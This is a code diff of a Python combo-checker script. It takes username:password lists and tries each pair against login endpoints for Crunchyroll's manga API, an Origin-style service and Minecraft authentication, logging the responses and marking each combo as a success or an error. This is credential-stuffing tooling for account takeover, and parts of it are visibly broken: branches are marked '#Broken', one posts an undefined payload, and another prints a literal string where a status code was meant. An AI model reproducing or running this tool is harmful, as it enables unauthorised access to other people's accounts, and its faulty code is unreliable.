@@ -12,64 +12,82 @@ def checker(clist: list):
     s = int(input("Enter Number for URL: "))
     if s == 1:
         for combo in clist: #Broken
-            a = combo.split(":")
-            print(combo)
-            user = a[0]
-            pwd = a[1]
-            header = {
-            "Host": "api-manga.crunchyroll.com" ,
-            "Content-Type": "application/x-www-form-urlencoded" ,
-            "Accept": "*/*" ,
-            "Connection": "keep-alive" ,
-            "User-Agent": "Manga/4.2.0 (iPad; iOS 14.4; Scale/2.00)" ,
-            "Accept-Language": "nl-NL;q=1, ar-NL;q=0.9" ,
-            "Accept-Encoding": "gzip, deflate, br" ,
-            }
-            payload = f"access_token=dcIhv87VpKsqLCZ&account={user}&api_ver=1.0&device_id=123-456-789&device_type=com.crunchyroll.manga.ipad&duration=6000&format=json&password={pwd}"
+            try:
+                a = combo.split(":")
+                user = a[0]
+                pwd = a[1]
+                header = {
+                "Host": "api-manga.crunchyroll.com" ,
+                "Content-Type": "application/x-www-form-urlencoded" ,
+                "Accept": "*/*" ,
+                "Connection": "keep-alive" ,
+                "User-Agent": "Manga/4.2.0 (iPad; iOS 14.4; Scale/2.00)" ,
+                "Accept-Language": "nl-NL;q=1, ar-NL;q=0.9" ,
+                "Accept-Encoding": "gzip, deflate, br" ,
+                }
+                payload = f"access_token=dcIhv87VpKsqLCZ&account={user}&api_ver=1.0&device_id=123-456-789&device_type=com.crunchyroll.manga.ipad&duration=6000&format=json&password={pwd}"
+                with requests.Session() as s2:
+                    p = s2.post(urls[0], data=payload)
+                    log(f"[{combo}]{p.text}\n")
+                    if "Incorrect login information" in p.text:
+                        cprint(f"{combo} = ERROR\n", "red")
+                    else:
+                        cprint(f"{combo} = Success\n", "green")
+            except Exception:
+                pass
+
     elif s == 2: #Broken
         for combo in clist:
-            account = combo.replace("\n", "")
-            a = account.split(":")
-            user = a[0]
-            pwd = a[1]
-            with requests.Session() as s2:
-                p = s2.post(urls[1], data=payload)
-                if "Incorrect login information" in p.text:
-                    cprint(f"{a[0]}:{a[0]} = ERROR", "red")
-                else:
-                    cprint(f"{a[0]}:{a[0]} = Success", "green")
+            try:
+                a = combo.split(":")
+                user = a[0]
+                pwd = a[1]
+                with requests.Session() as s2:
+                    p = s2.post(urls[1], data=payload)
+                    if "Incorrect login information" in p.text:
+                        cprint(f"{a[0]}:{a[0]} = ERROR\n", "red")
+                    else:
+                        cprint(f"{a[0]}:{a[0]} = Success\n", "green")
+            except Exception:
+                pass
+
     elif s == 3:
         for combo in clist:
-            account = combo.replace("\n", "")
-            a = account.split(":")
-            user = a[0]
-            pwd = a[1]
-            payload = json.dumps({
-                'agent': {
-                    'name': "Origin",
-                    'version': 1
-                },
-                "email": user,
-                "password": pwd,
-                "_rememberMe": "off",
-                "rememberMe": "off"
-            })
-            with requests.Session() as s1:
-                p = s1.post(urls[2], data=payload)
-                print(p.text)
+            try:
+                a = combo.split(":")
+                user = a[0]
+                pwd = a[1]
+                payload = json.dumps({
+                    'agent': {
+                        'name': "Origin",
+                        'version': 1
+                    },
+                    "email": user,
+                    "password": pwd,
+                    "_rememberMe": "off",
+                    "rememberMe": "off"
+                })
+                with requests.Session() as s1:
+                    p = s1.post(urls[2], data=payload)
+                    print(p.text)
+            except Exception:
+                pass
+
     elif s == 4:
         for combo in clist:
-            account = combo.replace("\n", "")
-            a = account.split(":")
-            user, pwd = a[0], a[1]
-            body = json.dumps({
-                'agent': {
-                    'name': 'Minecraft',
-                    'version': 1
-                },
-                'username': user,
-                'password': pwd,
-                'clientToken': "fff"
-            })
-            r = requests.post(url=urls[3], headers=header, data=body)
-            print(r.status_code)
+            try:
+                a = combo.split(":")
+                user, pwd = a[0], a[1]
+                body = json.dumps({
+                    'agent': {
+                        'name': 'Minecraft',
+                        'version': 1
+                    },
+                    'username': user,
+                    'password': pwd,
+                    'clientToken': "fff"
+                })
+                r = requests.post(url=urls[3], headers=header, data=body)
+                cprint(f"r.status_code\n", "purple")
+            except Exception:
+                pass
